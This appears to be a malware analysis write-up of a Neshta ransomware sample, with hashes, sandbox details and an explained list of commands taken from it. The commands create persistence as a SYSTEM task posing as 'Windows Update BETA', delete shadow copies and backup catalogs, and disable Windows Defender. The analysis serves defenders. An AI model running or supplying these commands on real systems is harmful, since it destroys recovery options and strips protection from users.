# Neshta Ransomware family

* [https://app.any.run/tasks/990b6a36-241d-4998-8272-ba6c273aa15c/](https://app.any.run/tasks/990b6a36-241d-4998-8272-ba6c273aa15c/)

## History

The ransomware Neshta was first discovered in 2007. It was designed to encrypt files on infected computer systems and demand a ransom in exchange for the decryption key. Neshta primarily spread through malicious emails, compromised software downloads, and other infection methods. Since its discovery, it has been one of many examples of ransomware that have caused disruptions and computer security issues worldwide.

## Sample Information

| Information       | Value                                         |
|-------------------|-----------------------------------------------|
| Analysis date     | December 17, 2023 at 07:20:45                 |
| OS                | Windows 10 Professional (build: 19044, 64 bit)|
| Tags              | ransomware                                    |
| File info         | PE32 executable (GUI) Intel 80386, for MS Windows |
| MD5               | BD3421CDFEA65D7037533121A4B82AEA              |
| SHA256            | 0E5C298EEA81721D30202057A8F1B6EEE18A1BFBB102248F1E862A96128097B9 |


## Setup


![create-diectory](/images/neshta/neshta-01.png)
![create-diectory](/images/neshta/neshta-02.png)

"/c SCHTASKS.exe /Create /RU \"NT AUTHORITY\\SYSTEM\" /sc onstart /TN \"Windows Update BETA\" /TR \"C:\\Users\\Admin\\AppData\\Local\\Temp\\3582-490\\Windows Servers Runtime.exe\" /F"

cmd.exe "/c vssadmin.exe delete shadows /all /quiet&&wbadmin delete catalog -quiet && bcdedit.exe /set {current} nx AlwaysOff && wmic SHADOWCOPY DELETE"

cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"%s\" "

cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Remove-WindowsFeature Windows-Defender&&powershell -inputformat none -outputformat none -NonInteractive -Command Windows-Defender-GUI&&powershell -inputformat none -outputformat none -NonInteractive -Command New-ItemProperty -Path \"HKLM:SOFTWAREPoliciesMicrosoftWindows Defender\" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force "

cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Get-Service WinDefend | Stop-Service -PassThru | Set-Service -StartupType Disabled&&powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -DisableRealtimeMonitoring $true "


1.  **vssadmin, wbadmin, bcdedit, and wmic command**: `cmd.exe "/c vssadmin.exe delete shadows /all /quiet&&wbadmin delete catalog -quiet && bcdedit.exe /set {current} nx AlwaysOff && wmic SHADOWCOPY DELETE"`
    
    -   `vssadmin.exe delete shadows /all /quiet`: Deletes all system restore points (Shadow Copies) without displaying messages.
    -   `wbadmin delete catalog -quiet`: Deletes the backup catalog, which can prevent previous backups from being restored.
    -   `bcdedit.exe /set {current} nx AlwaysOff`: Disables Data Execution Prevention (DEP) for the current system, potentially making the system more vulnerable to attacks.
    -   `wmic SHADOWCOPY DELETE`: Also deletes shadow copies, another form of restore points.
2.  **Add-MpPreference command (PowerShell)**: `cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"%s\" "`
    
    -   Adds an exclusion in Windows Defender for a specific path (replaced by `%s`), meaning files in this path will not be scanned by Windows Defender.
3.  **Remove-WindowsFeature, New-ItemProperty commands (PowerShell)**: `cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Remove-WindowsFeature Windows-Defender&&powershell -inputformat none -outputformat none -NonInteractive -Command Windows-Defender-GUI&&powershell -inputformat none -outputformat none -NonInteractive -Command New-ItemProperty -Path \"HKLM:SOFTWAREPoliciesMicrosoftWindows Defender\" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force "`
    
    -   Disables and removes Windows Defender (Windows' built-in antivirus) along with its graphical interface.
    -   Modifies the registry to disable Windows Defender's antispyware feature.
4.  **Get-Service, Stop-Service, Set-Service, Set-MpPreference commands (PowerShell)**: `cmd.exe "/c powershell -inputformat none -outputformat none -NonInteractive -Command Get-Service WinDefend | Stop-Service -PassThru | Set-Service -StartupType Disabled&&powershell -inputformat none -outputformat none -NonInteractive -Command Set-MpPreference -DisableRealtimeMonitoring $true "`
    
    -   Stops the Windows Defender service (WinDefend), disables it at startup, and turns off Windows Defender's real-time monitoring.